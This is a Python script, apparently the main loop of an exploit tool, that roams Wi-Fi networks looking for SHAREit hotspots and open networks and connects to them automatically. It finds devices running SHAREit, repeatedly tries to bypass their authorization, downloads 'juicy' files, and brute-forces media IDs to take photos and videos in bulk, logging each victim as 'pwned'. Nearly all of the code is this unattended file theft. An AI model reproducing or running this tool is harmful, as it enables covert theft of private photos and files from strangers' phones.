import subprocess, os, re, json, time, sys
import traceback
from datetime import datetime
from exploit import exploit, helper
from threading import Lock, Thread


class AuthorizationChecker(object):
    """
    AuthorizationChecker
    This class would create a background thread that checks authorization to download files and try to bypass auth if possible
    """
    def __init__(self, src_ip ='192.168.43.165', target_ip='192.168.43.1'):
        self.src_ip = src_ip
        self.target_ip = target_ip
        self.stopResponder = False
        self.start()
                
    def start(self):
        self.thread = Thread(target=self.run, args=())
        # Run the thread in daemon mode.
        self.thread.daemon = True
        self.thread.start()
        
    def stop(self):
        self.stopResponder = True

    def restart(self):
        self.stopResponder = True
        time.sleep(0.5)
        self.start()
               
    def run(self):
        """ Method that runs forever unless stopped """
        if not self.stopResponder:
            try:
                if not exploit.is_authorized(self.target_ip):
                    print 'Tyring to get authorization to {0}...'.format(self.target_ip)
                    exploit.auto_connect(self.src_ip, self.target_ip)
                time.sleep(5)
                self.run()
            except Exception as e:
                #print ('[!] Error occured,' , e)
                if not exploit.is_reachable(self.target_ip):
                	print '[!] Target no longer reachable'
                else:
                	print ('[!] Error occured,' , e)
                #uncomment line below if you would like it to keep retrying to connect to host even if it was unreachable
                self.run()
        #print('Exiting responder...')


class ExecuteTask(object):
    """
    Execute task in background
    """
    def __init__(self, func, *args, **kargs):
        global pwned_targets
        self.func = func
        self.args = args
        self.kargs = kargs
        self.task_identifier = '{0}_{1}_{2}'.format(str(func),str(args),str(kargs))
        self.target_identifier = '{0}_{1}'.format(target_network['bssid'], target)
        if self.target_identifier not in pwned_targets:
            pwned_targets[self.target_identifier] = []
        #self.thread = Thread(target=self.run, args=())
        # Run the thread in daemon mode.
        #self.thread.daemon = True
        #self.thread.start()
        self.run() #Run in the main process not as thread
                
    def run(self):
        global pwned_targets
        if self.task_identifier not in pwned_targets[self.target_identifier]:
            max_retries = 5
            retry = 0
            result = None
            while result is None and retry < max_retries:
                time.sleep(3)
                retry += 1
                result = self.func(*self.args, **self.kargs) 
            if result is not None:
                pwned_targets[self.target_identifier].append(self.task_identifier)


class Logger:
    filename = None
    logdir = "tmp/log"
    filepath = None
    target_ip = None
    target_network = None

    def __init__(self):
        self.filename = "{0}.txt".format(datetime.now().strftime("%Y-%m-%d"))
        realpath = helper.translate_path(self.logdir)
        if not os.path.isdir(realpath):
            try:
                helper.mkdir(realpath)
            except Exception as e:
                print 'Unable to create log directory'
        self.filepath = os.path.join(realpath,self.filename)

    def error(self, text):
        self.write('[!] {0}'.format(text))

    def info(self, text):
        self.write('[*] {0}'.format(text))

    def success(self, text):
        self.write('[+] {0}'.format(text))

    def write(self, text):
        try:
            with open(self.filepath,'a') as f:
                data = ["\r\n",datetime.now().strftime(" %Y-%m-%d %H:%M:%S ").center(80,'-')]
                if self.target_network is not None:
                    data.append('[NETWORK]: {0}'.format(self.target_network['ssid']))
                if self.target_ip is not None:
                    data.append('[TARGET_IP]: {0}'.format(self.target_ip))
                data.append(text)
                f.write('\r\n'.join(data))
                f.close()
        except Exception as e:
            print('Unable to log data', e)




def _print(string):
    sys.stdout.write(string)
    sys.stdout.flush()

def is_pwned(target_identifier):
    status = False
    if target_identifier in pwned_targets.keys() and len(pwned_targets[target_identifier]) >= 5:
        status = True
    return status


def quote(string):
    return "'{0}'".format(string.replace("\\","\\\\").replace("'","'\\''"))
def wifi_connect(target):
    cmd = 'nmcli device wifi connect {0}'.format(quote(target['ssid']))
    if target['auth'].lower() != 'open' and 'password' in network and network['password'] is not None:
        cmd += ' password {1}'.format(quote(target['password']))
    os.system(cmd)

def wifi_disconnect(ssid):
    networks = str(subprocess.check_output(['nmcli -t -f type,name,UUID con'],shell=True))
    for network in networks.split('\n'):
        network = network.split(":")
        regex = re.escape(ssid.lower()) + r'(\s+[0-9]+)?'
        if (network[0] == "802-11-wireless" and re.match(regex, network[1].strip().lower())):
            os.system("nmcli connection delete uuid "+ network[2])
            #We are not gonna break, just in case multiple networks got the same ssid

def get_my_ip(ssid):
    output = None
    networks = str(subprocess.check_output(['nmcli -t -f type,name,UUID,active c'],shell=True))
    for network in networks.split('\n'):
        network = network.split(":")
        regex = re.escape(ssid.lower()) + r'(\s+[0-9]+)?'
        if (network[0] == "802-11-wireless" and re.match(regex, network[1].strip().lower()) and network[3].lower() == "yes"):
            result = str(subprocess.check_output(['nmcli c show {0}'.format(network[2])],shell=True)).split('\n')
            for line in result:
                if(line.strip()[0:15] == "IP4.ADDRESS[1]:"):
                    ip = line.strip()[16:]
                    output = ip.split('/')[0].strip()
                    break
            break
    return output

def get_thumbs(mediatype='photo'):
    data = []
    download_path = 'tmp/data/{0}/{1}/media/{2}'.format(clean_target_network, clean_target_ip,mediatype)
    if mediatype in exploit.assets_with_thumbs:
        download_path += '/thumbnail'
        realpath = helper.translate_path(download_path)
        if os.path.isdir(realpath):
            for filename in os.listdir(realpath):
                if filename.endswith(".jpg"):
                    data.append(os.path.join(realpath,filename))
    else:
        download_path += '/raw'
        realpath = helper.translate_path(download_path)
        if os.path.isdir(realpath):
            for filename in os.listdir(realpath):
                    data.append(os.path.join(realpath,filename))
    return data



def download_media_from_db(target,mediatype = 'photo',file_format = 'thumbnail'):
    
    download_path = helper.translate_path('tmp/data/{0}/{1}/media/{2}/{3}'.format(clean_target_network, clean_target_ip,mediatype,file_format))
    if not os.path.isdir(download_path):
        helper.mkdir(download_path)

    media_db_result = exploit.list_media_from_db(target, mediatype)
    if media_db_result is not None and media_db_result > 0:
        logger.info('MediaDB data: ' + json.dumps(media_db_result))
        try:
            if file_format == 'thumbnail':
                asset_ids = media_db_result.keys()
                requested_file_type = mediatype
            else:
                asset_ids = [file['path'] for file in media_db_result.itervalues()]
                requested_file_type = 'file'
            result = exploit.download_multi_assets(target,download_path,requested_file_type,asset_ids,file_format)
            if result is not None and len(result) > 0:
                logger.success('Downloaded {0} {1}s from %s mediadb'.format(mediatype, file_format, target))
        except Exception as e:
            print e
            pass
    return media_db_result



def brute_media(target,mediatype = 'photo', id_from=0, id_to=2000, id_step=20,retry=0):
    download_path = helper.translate_path('tmp/data/{0}/{1}/media/{2}/thumbnail'.format(clean_target_network, clean_target_ip,mediatype))
    if not os.path.isdir(download_path):
        helper.mkdir(download_path)
    print '[*] Bruteforcing from {0} to {1}'.format(str(id_from),str(id_to))
    data = exploit.brute_assets(target,download_path, mediatype, id_from, id_to, id_step)
    print data
    #if len(data) > 0 or retry >= max_bruteforce_retries:
    oldfrom = id_from
    id_from = id_to + 1;
    id_to = 2 * id_to - oldfrom;
    found = len(get_thumbs(mediatype))
    limit = files_max_download[mediatype] if mediatype in files_max_download else files_max_download['other']
    if id_from < brute_id_max and found < limit and exploit.is_reachable(target):
        brute_media(target,mediatype,id_from,id_to,id_step)

    return len(get_thumbs(mediatype))

def download_media(target,mediatype='photo'):
    download_path = helper.translate_path('tmp/data/{0}/{1}/media/{2}/raw'.format(clean_target_network, clean_target_ip,mediatype))
    discovered_assets = get_thumbs(mediatype)
    if (len(discovered_assets) > 0):
        asset_ids = []
        for asset in discovered_assets:
            filename = os.path.basename(asset) #thumbnail_192-168-43-1_photo_91511_151624986596.jpg
            filename = filename.split('_')
            if len(filename) >= 4:
                asset_id = filename[3].split('-')[0]
                asset_ids.append(asset_id)
        if len(asset_ids) > 0:
            return exploit.download_multi_assets(target,download_path,mediatype,asset_ids,'raw')

def pwn_target(target,myip='192.168.43.100'):
    max_retries = 5
    retry = 0
    auth_checker = AuthorizationChecker(myip,target) #Run authorization checker daemon in bg
    
    #Download Juicy Files
    print '[*] Downloading Juicy Files'
    ExecuteTask(exploit.download_juicy, target,helper.translate_path('tmp/data/{0}/{1}/juicy'.format(clean_target_network, clean_target_ip)))
    #Get Photo thumbs from mediadb
    print '[*] Getting Photo thumbs from mediadb'
    ExecuteTask(download_media_from_db, target, 'photo')
    #Get Video thumbs from mediadb
    print '[*] Getting Video thumbs from mediadb'
    ExecuteTask(download_media_from_db, target, 'video')
    #Bruteforce Photo IDs
    print '[*] Bruteforcing Photo IDs'
    ExecuteTask(brute_media, target, 'photo')
    #Get Video thumbs from mediadb
    #ExecuteTask(brute_media, target, 'video')
    print '[*] Downloading discovered photos'
    ExecuteTask(download_media, target, 'photo')

    auth_checker.stop()
    #if exploit.connection_errors['unreachable_con_count'] < exploit.connection_errors['max_unreachable_con_count'] or exploit.is_reachable(target):
    #	pwned_targets.append('{0}_{1}'.format(target_network['bssid'], target))





pwned_networks = []
pwned_targets = {}
logger = Logger()
nonclean = re.compile(r'[^A-Za-z0-9\.]+')
max_bruteforce_retries = 3
brute_id_max = 300000
files_max_download = {'photo':1000,'video':50,'other':10}
i = 1
while True:

    try:
        target_network = None
        _print("\rScanning available networks"+"."*i+" "*15),
        i += 1
        if i > 9:
            i = 1
        
        #SHAREit Networks
        #logger.info('Searching for SHAREit hotspots...')
        networks = exploit.discover_networks()
        try:
            networks = sorted(networks, key=lambda k:int(k['strength']))
        except Exception as e:
            print ("Error Sorting networks", e)

        if networks is not None and len(networks) > 0:
            print json.dumps(networks)
            logger.success('Found {0} SHAREit hotspots\n{1}'.format(str(len(networks)),json.dumps(networks)))
            for network in networks:
                if network['bssid'] not in pwned_networks and (network['auth'].lower() == 'open' or ('password' in network and network['password'] is not None)):
                    target_network = network
        else:
            #Open Networks
            #logger.error('Couldnot find any SHAREit hotspots')
            #logger.info('Searching for public wifi networks...')
            networks = exploit.get_available_networks()
            if networks is not None and len(networks) > 0:
                #logger.success('Found {0} wifi networks'.format(str(len(networks))))
                for network in networks:
                    if network['auth'].lower() == 'open' and network['bssid'] not in pwned_networks:
                        target_network = network

        if target_network is not None:
            print "Connecting to {0}...".format(target_network['ssid'])
            wifi_connect(target_network)
            

            print 'processing...'
            target = None
            myip = get_my_ip(target_network['ssid'])
            #Check default android ip, trying to save time instead of scanning the whole network
            if not is_pwned("{0}_192.168.43.1".format(target_network['bssid'])):
                result = exploit.is_shareit_running('192.168.43.1')
                if(result['status'] == True):
                    target = '192.168.43.1'

            #Scan IP range for potenial
            if target is None:
                if myip is None:
                    myip = '192.168.43.100'
                targets = exploit.scan_ip_range(myip)
                if targets is not None and len(targets) > 0:
                    for ptarget in targets:
                        if not is_pwned("{0}_{1}".format(target_network['bssid'], ptarget)) :
                            target = ptarget
                            break

            if target is not None:
                clean_target_network = nonclean.sub('',target_network['ssid'])
                clean_target_ip = nonclean.sub('',target)
                pwn_target(target,myip)
            else:
                pwned_networks.append(target_network['bssid'])
 
            print 'Disconnecting from {0}...'.format(target_network['ssid'])
            wifi_disconnect(target_network['ssid'])
        else:
            #Reset Pwned networks to rescan them for other potential targets
            pwned_networks = []
        time.sleep(5)
    except Exception as e:
        print 'Error occured', e
        traceback.print_exc()
#    break
